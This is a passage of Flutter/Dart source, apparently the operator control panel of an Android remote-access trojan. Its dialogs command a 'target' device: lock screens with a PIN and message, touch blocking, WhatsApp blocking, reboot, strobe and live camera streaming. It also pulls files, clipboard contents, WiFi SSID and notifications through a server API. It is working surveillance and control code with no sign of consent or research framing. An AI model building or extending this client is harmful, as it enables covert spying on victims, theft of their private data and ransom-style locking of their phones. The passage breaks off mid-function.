            textColor: ControlTheme.white,
            onTap: () {
              Navigator.pop(context);
              _cmd('reboot_device');
            },
          ),
        ],
      ),
    );
  }

  // ─── SWITCH DIALOGS ─────────────────────────────────────────
  void _showTorchDialog() {
    showDialog(
      context: context,
      builder: (_) => StatefulBuilder(
        builder: (ctx, ss) => _brutalDialog(
          title: 'Torch',
          icon: Icons.flashlight_on_rounded,
          iconColor: ControlTheme.yellow,
          contentWidget: _switchRow(
            'Torch Status',
            _torchOn,
            (val) {
              ss(() => _torchOn = val);
              _cmd(val ? 'torch_on' : 'torch_off');
            },
          ),
          actions: [
            _dialogBtn(
              label: 'Close',
              onTap: () => Navigator.pop(ctx),
            ),
          ],
        ),
      ),
    );
  }

  void _showStrobeDialog() {
    showDialog(
      context: context,
      builder: (_) => StatefulBuilder(
        builder: (ctx, ss) => _brutalDialog(
          title: 'Strobe',
          icon: Icons.flash_on_rounded,
          iconColor: ControlTheme.yellow,
          contentWidget: _switchRow(
            'Strobe Status',
            _strobeOn,
            (val) {
              ss(() => _strobeOn = val);
              _cmd(val ? 'flash_strobe' : 'stop_strobe');
            },
          ),
          actions: [
            _dialogBtn(
              label: 'Close',
              onTap: () => Navigator.pop(ctx),
            ),
          ],
        ),
      ),
    );
  }

  Widget _switchRow(String label, bool value, ValueChanged<bool> onChanged) {
    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: ControlTheme.yellowSoft,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: ControlTheme.black, width: 2.5),
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Text(
            label,
            style: const TextStyle(
              color: ControlTheme.black,
              fontSize: 13,
              fontWeight: FontWeight.w800,
            ),
          ),
          Switch(
            value: value,
            onChanged: onChanged,
            activeColor: ControlTheme.black,
            activeTrackColor: ControlTheme.yellow,
            inactiveThumbColor: ControlTheme.white,
            inactiveTrackColor: ControlTheme.textMuted,
          ),
        ],
      ),
    );
  }

  // ─── TOUCH BLOCK ────────────────────────────────────────────
  void _showTouchBlockDialog() {
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => _brutalDialog(
        title: 'Touch Block',
        icon: Icons.touch_app_rounded,
        iconColor: ControlTheme.error,
        contentWidget: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              'Set duration for touch block in seconds',
              style: TextStyle(
                color: ControlTheme.textSec,
                fontSize: 12,
                fontWeight: FontWeight.w600,
              ),
            ),
            const SizedBox(height: 14),
            _field(ctrl, 'Duration (seconds)', hint: '10', isNum: true),
          ],
        ),
        actions: [
          _dialogBtn(
            label: 'Cancel',
            onTap: () => Navigator.pop(context),
          ),
          _dialogBtn(
            label: 'BLOCK TOUCH',
            bgColor: ControlTheme.error,
            textColor: ControlTheme.white,
            onTap: () {
              Navigator.pop(context);
              final dur =
                  ctrl.text.trim().isEmpty ? '10' : ctrl.text.trim();
              _cmd('touch_block', extra: dur);
            },
          ),
        ],
      ),
    );
  }

  // ─── OVERLAY LOCK ───────────────────────────────────────────
  void _showOverlayLockDialog() {
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => _brutalDialog(
        title: 'Overlay Lock',
        icon: Icons.layers_rounded,
        iconColor: ControlTheme.blue,
        contentWidget: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              'Set password/pin for overlay lock',
              style: TextStyle(
                color: ControlTheme.textSec,
                fontSize: 12,
                fontWeight: FontWeight.w600,
              ),
            ),
            const SizedBox(height: 14),
            _field(ctrl, 'Password Overlay', hint: 'Enter password/pin'),
          ],
        ),
        actions: [
          _dialogBtn(
            label: 'Cancel',
            onTap: () => Navigator.pop(context),
          ),
          _dialogBtn(
            label: 'LOCK',
            bgColor: ControlTheme.blue,
            textColor: ControlTheme.white,
            onTap: () {
              Navigator.pop(context);
              final pass =
                  ctrl.text.trim().isEmpty ? '1234' : ctrl.text.trim();
              _cmd('overlay_lock', extra: pass);
            },
          ),
        ],
      ),
    );
  }

  // ─── LOCK LIVE ──────────────────────────────────────────────
  void _lockLiveDialog() {
    final msgCtrl = TextEditingController();
    final pinCtrl = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => _brutalDialog(
        title: 'Lock Live + Chat',
        icon: Icons.lock_rounded,
        iconColor: ControlTheme.error,
        contentWidget: Column(
          children: [
            const Text(
              'Target locked + two-way chat',
              style: TextStyle(
                color: ControlTheme.textSec,
                fontSize: 12,
                fontWeight: FontWeight.w600,
              ),
            ),
            const SizedBox(height: 14),
            _field(msgCtrl, 'Lock screen message',
                hint: 'This device is locked by administrator'),
            const SizedBox(height: 12),
            _field(pinCtrl, 'Unlock PIN', hint: '1234', isNum: true),
          ],
        ),
        actions: [
          _dialogBtn(
            label: 'Cancel',
            onTap: () => Navigator.pop(context),
          ),
          _dialogBtn(
            label: 'LOCK LIVE',
            bgColor: ControlTheme.error,
            textColor: ControlTheme.white,
            onTap: () {
              Navigator.pop(context);
              final msg = msgCtrl.text.trim().isEmpty
                  ? 'DEVICE LOCKED BY ADMINISTRATOR'
                  : msgCtrl.text.trim();
              final pin = pinCtrl.text.trim().isEmpty
                  ? '1234'
                  : pinCtrl.text.trim();
              _cmd('lock_live', extra: '$msg|$pin');
            },
          ),
        ],
      ),
    );
  }

  // ─── APP BLOCK ──────────────────────────────────────────────
  void _showAppBlockSheet() {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (_) => Container(
        decoration: const BoxDecoration(
          color: ControlTheme.white,
          borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
          border: Border(
            top: BorderSide(color: ControlTheme.black, width: 3),
            left: BorderSide(color: ControlTheme.black, width: 3),
            right: BorderSide(color: ControlTheme.black, width: 3),
          ),
        ),
        child: DraggableScrollableSheet(
          initialChildSize: 0.4,
          maxChildSize: 0.6,
          expand: false,
          builder: (_, sc) => Column(
            children: [
              Container(
                margin: const EdgeInsets.only(top: 12),
                height: 5,
                width: 40,
                decoration: BoxDecoration(
                  color: ControlTheme.black,
                  borderRadius: BorderRadius.circular(3),
                ),
              ),
              Padding(
                padding:
                    const EdgeInsets.symmetric(horizontal: 20, vertical: 14),
                child: Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: ControlTheme.yellow,
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(
                            color: ControlTheme.black, width: 2.5),
                        boxShadow: ControlShadowUtils.sm,
                      ),
                      child: const Icon(Icons.block_rounded,
                          color: ControlTheme.black, size: 20),
                    ),
                    const SizedBox(width: 12),
                    const Expanded(
                      child: Text(
                        'APP BLOCKED',
                        style: TextStyle(
                          color: ControlTheme.black,
                          fontSize: 15,
                          fontWeight: FontWeight.w900,
                          letterSpacing: 1.5,
                        ),
                      ),
                    ),
                    _PressWrap(
                      onTap: () => Navigator.pop(context),
                      child: Container(
                        padding: const EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          color: ControlTheme.black,
                          borderRadius: BorderRadius.circular(10),
                        ),
                        child: const Icon(Icons.close_rounded,
                            color: ControlTheme.yellow, size: 18),
                      ),
                    ),
                  ],
                ),
              ),
              Container(height: 2, color: ControlTheme.black),
              const SizedBox(height: 8),
              Expanded(
                child: ListView(
                  controller: sc,
                  padding: const EdgeInsets.symmetric(horizontal: 16),
                  children: [
                    _buildAppBlockItem(
                      'WhatsApp',
                      'com.whatsapp',
                      Icons.chat_bubble_outline,
                      _whatsappBlocked,
                      () {
                        setState(() {
                          _whatsappBlocked = !_whatsappBlocked;
                        });
                        _cmd(
                          _whatsappBlocked ? 'block_app' : 'unblock_app',
                          extra: 'com.whatsapp',
                        );
                      },
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildAppBlockItem(String name, String package, IconData icon,
      bool isBlocked, VoidCallback onTap) {
    return Container(
      margin: const EdgeInsets.symmetric(vertical: 6),
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
      decoration: BoxDecoration(
        color: ControlTheme.white,
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: ControlTheme.black, width: 2.5),
        boxShadow: ControlShadowUtils.sm,
      ),
      child: Row(
        children: [
          Container(
            width: 48,
            height: 48,
            decoration: BoxDecoration(
              color: ControlTheme.yellow,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: ControlTheme.black, width: 2.5),
            ),
            child: Icon(icon, color: ControlTheme.black, size: 26),
          ),
          const SizedBox(width: 14),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  name,
                  style: const TextStyle(
                    color: ControlTheme.black,
                    fontSize: 14,
                    fontWeight: FontWeight.w900,
                  ),
                ),
                Text(
                  package,
                  style: const TextStyle(
                    color: ControlTheme.textMuted,
                    fontSize: 10,
                    fontWeight: FontWeight.w600,
                  ),
                ),
              ],
            ),
          ),
          _PressWrap(
            onTap: onTap,
            child: Container(
              padding:
                  const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
              decoration: BoxDecoration(
                color: isBlocked ? ControlTheme.success : ControlTheme.error,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: ControlTheme.black, width: 2.5),
              ),
              child: Text(
                isBlocked ? 'Unblock' : 'Block',
                style: const TextStyle(
                  color: ControlTheme.white,
                  fontSize: 12,
                  fontWeight: FontWeight.w900,
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ─── CAM PICKER ─────────────────────────────────────────────
  void _showCamPicker(Function(String) onPick) {
    String sel = 'back';
    showDialog(
      context: context,
      builder: (_) => StatefulBuilder(
        builder: (ctx, ss) => _brutalDialog(
          title: 'Select Camera',
          icon: Icons.camera_alt_rounded,
          iconColor: ControlTheme.blue,
          contentWidget: Row(
            mainAxisAlignment: MainAxisAlignment.spaceEvenly,
            children: ['back', 'front'].map((v) {
              final isSel = sel == v;
              return _PressWrap(
                onTap: () => ss(() => sel = v),
                child: Container(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 24, vertical: 16),
                  decoration: BoxDecoration(
                    color: isSel ? ControlTheme.yellow : ControlTheme.white,
                    borderRadius: BorderRadius.circular(14),
                    border: Border.all(
                      color: ControlTheme.black,
                      width: isSel ? 3 : 2,
                    ),
                    boxShadow: isSel ? ControlShadowUtils.sm : null,
                  ),
                  child: Column(
                    children: [
                      Icon(
                        v == 'back'
                            ? Icons.camera_rear_rounded
                            : Icons.camera_front_rounded,
                        color: ControlTheme.black,
                        size: 34,
                      ),
                      const SizedBox(height: 8),
                      Text(
                        v == 'back' ? 'Back' : 'Front',
                        style: const TextStyle(
                          color: ControlTheme.black,
                          fontSize: 11,
                          fontWeight: FontWeight.w900,
                        ),
                      ),
                    ],
                  ),
                ),
              );
            }).toList(),
          ),
          actions: [
            _dialogBtn(
              label: 'Cancel',
              onTap: () => Navigator.pop(ctx),
            ),
            _dialogBtn(
              label: 'SELECT',
              bgColor: ControlTheme.yellow,
              onTap: () {
                Navigator.pop(ctx);
                onPick(sel);
              },
            ),
          ],
        ),
      ),
    );
  }

  // ─── INPUT DIALOG ───────────────────────────────────────────
  void _inputDialog(String title, String label, Function(String) onDone,
      {bool isNumber = false, String hint = ''}) {
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => _brutalDialog(
        title: title,
        icon: Icons.edit_rounded,
        iconColor: ControlTheme.blue,
        contentWidget: _field(ctrl, label, hint: hint, isNum: isNumber),
        actions: [
          _dialogBtn(
            label: 'Cancel',
            onTap: () => Navigator.pop(context),
          ),
          _dialogBtn(
            label: 'SEND',
            bgColor: ControlTheme.yellow,
            onTap: () {
              Navigator.pop(context);
              onDone(ctrl.text.trim());
            },
          ),
        ],
      ),
    );
  }

  // ─── LIVE DIALOG ────────────────────────────────────────────
  void _showLiveDialog() {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => ValueListenableBuilder<int>(
        valueListenable: _frameN,
        builder: (ctx, _, __) => Dialog(
          backgroundColor: Colors.transparent,
          insetPadding: const EdgeInsets.all(12),
          child: Container(
            decoration: BoxDecoration(
              color: ControlTheme.white,
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: ControlTheme.black, width: 3),
              boxShadow: ControlShadowUtils.md,
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                // Header
                Container(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 14, vertical: 12),
                  decoration: const BoxDecoration(
                    color: ControlTheme.yellow,
                    borderRadius:
                        BorderRadius.vertical(top: Radius.circular(17)),
                    border: Border(
                      bottom:
                          BorderSide(color: ControlTheme.black, width: 2.5),
                    ),
                  ),
                  child: Row(
                    children: [
                      Container(
                        width: 10,
                        height: 10,
                        decoration: const BoxDecoration(
                          color: ControlTheme.error,
                          shape: BoxShape.circle,
                        ),
                      ),
                      const SizedBox(width: 10),
                      Expanded(
                        child: Text(
                          'LIVE — $_liveTitle',
                          style: const TextStyle(
                            fontSize: 12,
                            fontWeight: FontWeight.w900,
                            color: ControlTheme.black,
                            letterSpacing: 1,
                          ),
                        ),
                      ),
                      Container(
                        padding: const EdgeInsets.symmetric(
                            horizontal: 8, vertical: 3),
                        decoration: BoxDecoration(
                          color: ControlTheme.black,
                          borderRadius: BorderRadius.circular(6),
                        ),
                        child: Text(
                          '$_fps fps',
                          style: const TextStyle(
                            fontSize: 9,
                            fontWeight: FontWeight.w900,
                            color: ControlTheme.yellow,
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
                // Frame
                Container(
                  constraints: BoxConstraints(
                    maxHeight: MediaQuery.of(context).size.height * 0.5,
                  ),
                  color: ControlTheme.black,
                  child: _frame != null
                      ? Image.memory(
                          _frame!,
                          fit: BoxFit.contain,
                          gaplessPlayback: true,
                          filterQuality: FilterQuality.low,
                        )
                      : const SizedBox(
                          height: 200,
                          child: Center(
                            child: Column(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                CircularProgressIndicator(
                                  color: ControlTheme.yellow,
                                  strokeWidth: 3,
                                ),
                                SizedBox(height: 12),
                                Text(
                                  'Waiting for frames...',
                                  style: TextStyle(
                                    color: ControlTheme.yellow,
                                    fontSize: 11,
                                    fontWeight: FontWeight.w700,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ),
                ),
                // Actions
                Container(
                  padding: const EdgeInsets.all(12),
                  decoration: const BoxDecoration(
                    color: ControlTheme.white,
                    borderRadius:
                        BorderRadius.vertical(bottom: Radius.circular(17)),
                    border: Border(
                      top: BorderSide(color: ControlTheme.black, width: 2.5),
                    ),
                  ),
                  child: Row(
                    children: [
                      Expanded(
                        child: _PressWrap(
                          onTap: () {
                            final isFront = _liveTitle.contains('DEPAN');
                            _stopLive();
                            Future.delayed(
                              const Duration(milliseconds: 300),
                              () => _startLive(
                                'live_camera_start',
                                isFront ? 'back' : 'front',
                              ),
                            );
                          },
                          child: Container(
                            padding: const EdgeInsets.symmetric(vertical: 12),
                            decoration: BoxDecoration(
                              color: ControlTheme.white,
                              borderRadius: BorderRadius.circular(10),
                              border: Border.all(
                                  color: ControlTheme.black, width: 2.5),
                            ),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: const [
                                Icon(Icons.cameraswitch_rounded,
                                    color: ControlTheme.black, size: 16),
                                SizedBox(width: 6),
                                Text(
                                  'Switch',
                                  style: TextStyle(
                                    color: ControlTheme.black,
                                    fontSize: 11,
                                    fontWeight: FontWeight.w900,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ),
                      ),
                      const SizedBox(width: 10),
                      Expanded(
                        child: _PressWrap(
                          onTap: () {
                            _stopLive();
                            Navigator.pop(ctx);
                          },
                          child: Container(
                            padding: const EdgeInsets.symmetric(vertical: 12),
                            decoration: BoxDecoration(
                              color: ControlTheme.error,
                              borderRadius: BorderRadius.circular(10),
                              border: Border.all(
                                  color: ControlTheme.black, width: 2.5),
                              boxShadow: ControlShadowUtils.sm,
                            ),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: const [
                                Icon(Icons.stop_rounded,
                                    color: ControlTheme.white, size: 16),
                                SizedBox(width: 6),
                                Text(
                                  'Stop',
                                  style: TextStyle(
                                    color: ControlTheme.white,
                                    fontSize: 11,
                                    fontWeight: FontWeight.w900,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    ).then((_) => _stopLive());
  }

  // ─── FILE MANAGER ───────────────────────────────────────────
  void _showFileManager() {
    _addLog('Opening File Manager...');
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (_) => _buildSheetContainer(
        title: 'File Manager',
        icon: Icons.folder_rounded,
        child: (sc) => _buildFileList(sc, '/'),
      ),
    );
  }

  Widget _buildSheetContainer({
    required String title,
    required IconData icon,
    required Widget Function(ScrollController) child,
  }) {
    return Container(
      decoration: const BoxDecoration(
        color: ControlTheme.white,
        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
        border: Border(
          top: BorderSide(color: ControlTheme.black, width: 3),
          left: BorderSide(color: ControlTheme.black, width: 3),
          right: BorderSide(color: ControlTheme.black, width: 3),
        ),
      ),
      child: DraggableScrollableSheet(
        initialChildSize: 0.7,
        maxChildSize: 0.95,
        minChildSize: 0.3,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
              margin: const EdgeInsets.only(top: 12),
              height: 5,
              width: 40,
              decoration: BoxDecoration(
                color: ControlTheme.black,
                borderRadius: BorderRadius.circular(3),
              ),
            ),
            Padding(
              padding: const EdgeInsets.symmetric(
                  horizontal: 20, vertical: 14),
              child: Row(
                children: [
                  Container(
                    padding: const EdgeInsets.all(10),
                    decoration: BoxDecoration(
                      color: ControlTheme.yellow,
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(
                          color: ControlTheme.black, width: 2.5),
                      boxShadow: ControlShadowUtils.sm,
                    ),
                    child: Icon(icon, color: ControlTheme.black, size: 20),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Text(
                      title.toUpperCase(),
                      style: const TextStyle(
                        color: ControlTheme.black,
                        fontSize: 15,
                        fontWeight: FontWeight.w900,
                        letterSpacing: 1.5,
                      ),
                    ),
                  ),
                  _PressWrap(
                    onTap: () => Navigator.pop(context),
                    child: Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: ControlTheme.black,
                        borderRadius: BorderRadius.circular(10),
                      ),
                      child: const Icon(Icons.close_rounded,
                          color: ControlTheme.yellow, size: 18),
                    ),
                  ),
                ],
              ),
            ),
            Container(height: 2, color: ControlTheme.black),
            Expanded(child: child(sc)),
          ],
        ),
      ),
    );
  }

  Widget _buildFileList(ScrollController sc, String path) {
    return FutureBuilder(
      future: _fetchFileList(path),
      builder: (ctx, snap) {
        if (snap.connectionState == ConnectionState.waiting) {
          return const Center(
            child: CircularProgressIndicator(
              color: ControlTheme.black,
              strokeWidth: 3,
            ),
          );
        }
        if (snap.hasError || !snap.hasData) {
          return _emptyState(
            Icons.folder_off_rounded,
            'Failed to load files',
          );
        }
        final files = snap.data as List<Map<String, dynamic>>;
        if (files.isEmpty) {
          return _emptyState(
            Icons.folder_open_rounded,
            'No files found',
          );
        }
        return ListView.separated(
          controller: sc,
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
          itemCount: files.length,
          separatorBuilder: (_, __) =>
              const Divider(color: ControlTheme.black, height: 2),
          itemBuilder: (_, i) {
            final file = files[i];
            final isDir = file['isDirectory'] == true;
            return ListTile(
              contentPadding:
                  const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
              leading: Container(
                width: 44,
                height: 44,
                decoration: BoxDecoration(
                  color: ControlTheme.yellow,
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: ControlTheme.black, width: 2.5),
                ),
                child: Icon(
                  isDir
                      ? Icons.folder_rounded
                      : Icons.insert_drive_file_rounded,
                  color: ControlTheme.black,
                  size: 22,
                ),
              ),
              title: Text(
                file['name'] ?? 'unknown',
                style: const TextStyle(
                  color: ControlTheme.black,
                  fontSize: 13,
                  fontWeight: FontWeight.w800,
                ),
              ),
              subtitle: Text(
                file['path'] ?? '',
                style: const TextStyle(
                  color: ControlTheme.textMuted,
                  fontSize: 10,
                  fontWeight: FontWeight.w600,
                ),
                overflow: TextOverflow.ellipsis,
              ),
              trailing: isDir
                  ? const Icon(
                      Icons.arrow_forward_ios_rounded,
                      color: ControlTheme.black,
                      size: 16,
                    )
                  : GestureDetector(
                      onTap: () => _downloadFile(file['path'] ?? ''),
                      child: Container(
                        padding: const EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          color: ControlTheme.yellow,
                          borderRadius: BorderRadius.circular(8),
                          border: Border.all(
                              color: ControlTheme.black, width: 2),
                        ),
                        child: const Icon(Icons.download_rounded,
                            color: ControlTheme.black, size: 16),
                      ),
                    ),
              onTap: isDir
                  ? () {
                      Navigator.pop(context);
                      _navigateToFolder(file['path'] ?? '');
                    }
                  : null,
            );
          },
        );
      },
    );
  }

  Widget _emptyState(IconData icon, String message) {
    return Center(
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              color: ControlTheme.yellow,
              shape: BoxShape.circle,
              border: Border.all(color: ControlTheme.black, width: 3),
              boxShadow: ControlShadowUtils.md,
            ),
            child: Icon(icon, color: ControlTheme.black, size: 40),
          ),
          const SizedBox(height: 14),
          Text(
            message,
            style: const TextStyle(
              color: ControlTheme.black,
              fontSize: 12,
              fontWeight: FontWeight.w900,
            ),
          ),
        ],
      ),
    );
  }

  Future<List<Map<String, dynamic>>> _fetchFileList(String path) async {
    try {
      final res = await http.get(
        Uri.parse(
            '$_kBase/api/list-files/$_id?path=${Uri.encodeComponent(path)}'),
      ).timeout(const Duration(seconds: 10));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        final files = data['files'] as List? ?? [];
        return files
            .map((f) => Map<String, dynamic>.from(f))
            .toList();
      }
      return [];
    } catch (e) {
      _addLog('Error fetching files: $e');
      return [];
    }
  }

  void _navigateToFolder(String path) {
    _addLog('Opening folder: $path');
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (_) => _buildSheetContainer(
        title: path,
        icon: Icons.folder_open_rounded,
        child: (sc) => _buildFileList(sc, path),
      ),
    );
  }

  void _downloadFile(String path) async {
    _addLog('Downloading: $path');
    try {
      final res = await http.get(
        Uri.parse(
            '$_kBase/api/download-file/$_id?path=${Uri.encodeComponent(path)}'),
      ).timeout(const Duration(seconds: 30));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        final content = data['content'] ?? '';
        final fileName = path.split('/').last;
        _addLog('Downloaded: $fileName');
        _toast('File downloaded', c: ControlTheme.success);

        showDialog(
          context: context,
          builder: (_) => _brutalDialog(
            title: fileName,
            icon: Icons.download_rounded,
            iconColor: ControlTheme.success,
            contentWidget: Container(
              constraints: const BoxConstraints(maxHeight: 300),
              padding: const EdgeInsets.all(14),
              decoration: BoxDecoration(
                color: ControlTheme.yellowSoft,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: ControlTheme.black, width: 2.5),
              ),
              child: SingleChildScrollView(
                child: SelectableText(
                  content,
                  style: const TextStyle(
                    color: ControlTheme.black,
                    fontSize: 12,
                    fontWeight: FontWeight.w600,
                  ),
                ),
              ),
            ),
            actions: [
              _dialogBtn(
                label: 'CLOSE',
                onTap: () => Navigator.pop(context),
              ),
            ],
          ),
        );
      } else {
        _toast('Download failed');
      }
    } catch (e) {
      _addLog('Download error: $e');
      _toast('Download error');
    }
  }

  // ─── CLIPBOARD ──────────────────────────────────────────────
  void _getClipboard() async {
    _addLog('Fetching clipboard...');
    try {
      final res = await http
          .get(Uri.parse('$_kBase/api/get-clipboard/$_id'))
          .timeout(const Duration(seconds: 8));

      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        final clips = data['clipboard'] as List? ?? [];
        _addLog('${clips.length} clipboard items');

        showModalBottomSheet(
          context: context,
          backgroundColor: Colors.transparent,
          isScrollControlled: true,
          builder: (_) => _buildSheetContainer(
            title: 'Clipboard (${clips.length})',
            icon: Icons.content_paste_rounded,
            child: (sc) => clips.isEmpty
                ? _emptyState(
                    Icons.content_paste_off_rounded, 'No clipboard items')
                : ListView.separated(
                    controller: sc,
                    padding: const EdgeInsets.symmetric(
                        horizontal: 16, vertical: 8),
                    itemCount: clips.length,
                    separatorBuilder: (_, __) => const Divider(
                        color: ControlTheme.black, height: 2),
                    itemBuilder: (_, i) {
                      final clip = clips[i];
                      return ListTile(
                        contentPadding: const EdgeInsets.symmetric(
                            horizontal: 0, vertical: 4),
                        leading: Container(
                          width: 44,
                          height: 44,
                          decoration: BoxDecoration(
                            color: ControlTheme.yellow,
                            borderRadius: BorderRadius.circular(10),
                            border: Border.all(
                                color: ControlTheme.black, width: 2.5),
                          ),
                          child: const Icon(Icons.content_paste_rounded,
                              color: ControlTheme.black, size: 22),
                        ),
                        title: Text(
                          clip['text']?.toString() ?? '',
                          style: const TextStyle(
                            color: ControlTheme.black,
                            fontSize: 12,
                            fontWeight: FontWeight.w700,
                          ),
                          maxLines: 2,
                          overflow: TextOverflow.ellipsis,
                        ),
                        subtitle: Text(
                          clip['time']?.toString() ?? '',
                          style: const TextStyle(
                            color: ControlTheme.textMuted,
                            fontSize: 10,
                            fontWeight: FontWeight.w600,
                          ),
                        ),
                        trailing: GestureDetector(
                          onTap: () {
                            _toast('Copied to clipboard',
                                c: ControlTheme.success);
                          },
                          child: Container(
                            padding: const EdgeInsets.all(8),
                            decoration: BoxDecoration(
                              color: ControlTheme.yellow,
                              borderRadius: BorderRadius.circular(8),
                              border: Border.all(
                                  color: ControlTheme.black, width: 2),
                            ),
                            child: const Icon(Icons.copy_rounded,
                                color: ControlTheme.black, size: 16),
                          ),
                        ),
                      );
                    },
                  ),
          ),
        );
      } else {
        _addLog('Failed to get clipboard');
        _toast('Failed to get clipboard');
      }
    } catch (e) {
      _addLog('Clipboard error: $e');
      _toast('Error: $e');
    }
  }

  // ─── SSID WiFi ──────────────────────────────────────────────
  void _getSSID() async {
    try {
      final res = await http
          .get(Uri.parse('$_kBase/api/get-ssid/$_id'))
          .timeout(const Duration(seconds: 8));

      if (res.statusCode == 200 && res.body.isNotEmpty) {
        final data = jsonDecode(res.body);
        final ssid = data['ssid']?.toString() ?? 'Tidak terdeteksi';
        _addLog('SSID: $ssid');

        showDialog(
          context: context,
          builder: (_) => _brutalDialog(
            title: 'WiFi SSID',
            icon: Icons.wifi,
            iconColor: ControlTheme.blue,
            contentWidget: Container(
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                color: ControlTheme.yellowSoft,
                borderRadius: BorderRadius.circular(14),
                border: Border.all(color: ControlTheme.black, width: 2.5),
              ),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Container(
                    padding: const EdgeInsets.all(14),
                    decoration: BoxDecoration(
                      color: ControlTheme.yellow,
                      shape: BoxShape.circle,
                      border: Border.all(
                          color: ControlTheme.black, width: 2.5),
                    ),
                    child: const Icon(Icons.wifi,
                        color: ControlTheme.black, size: 36),
                  ),
                  const SizedBox(height: 14),
                  Text(
                    ssid,
                    style: const TextStyle(
                      color: ControlTheme.black,
                      fontSize: 16,
                      fontWeight: FontWeight.w900,
                    ),
                    textAlign: TextAlign.center,
                  ),
                ],
              ),
            ),
            actions: [
              _dialogBtn(
                label: 'CLOSE',
                onTap: () => Navigator.pop(context),
              ),
            ],
          ),
        );
      } else {
        _addLog('Gagal mendapatkan SSID');
        _toast('Gagal mendapatkan SSID');
      }
    } catch (e) {
      _addLog('Error SSID: $e');
      _toast('Error: $e');
    }
  }

  // ─── NOTIFICATIONS ──────────────────────────────────────────
  void _fetchNotif() async {
    _addLog('Fetching notifications...');
    try {
      final res =
          await http.get(Uri.parse('$_kBase/api/get-notifications/$_id'));
      if (res.statusCode == 200) {
        final list = jsonDecode(res.body) as List;
        _addLog('${list.length} notifications');
        showModalBottomSheet(
          context: context,
          backgroundColor: Colors.transparent,
          isScrollControlled: true,
          builder: (_) => _buildSheetContainer(
            title: 'Notifications (${list.length})',
            icon: Icons.notifications_rounded,
            child: (sc) => ListView.separated(
              controller: sc,
              padding:
                  const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
              itemCount: list.length,
              separatorBuilder: (_, __) =>
                  const Divider(color: ControlTheme.black, height: 2),
              itemBuilder: (_, i) {
                final notif = list[i];
                return ListTile(
                  contentPadding:
                      const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                  leading: Container(
                    width: 44,
                    height: 44,
                    decoration: BoxDecoration(
                      color: ControlTheme.yellow,
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(
                          color: ControlTheme.black, width: 2.5),
                    ),
                    child: const Icon(Icons.notifications_rounded,
                        color: ControlTheme.black, size: 22),
                  ),
                  title: Text(
                    notif['title']?.toString() ?? '-',
                    style: const TextStyle(
                      color: ControlTheme.black,
                      fontSize: 13,
                      fontWeight: FontWeight.w800,
                    ),
                  ),
                  subtitle: Text(
                    notif['body']?.toString() ?? '',
                    style: const TextStyle(
                      color: ControlTheme.textMuted,
                      fontSize: 11,
                      fontWeight: FontWeight.w600,
                    ),
                  ),
                );
              },
            ),
          ),
        );
      }
    } catch (_) {
      _addLog('Notif error');
    }
  }

  // ─── IMAGE / LOCATION / TEXT DIALOGS ────────────────────────
  void _imgDialog(String b64, String title) {
    try {
      final c = b64.contains(',') ? b64.split(',').last : b64;
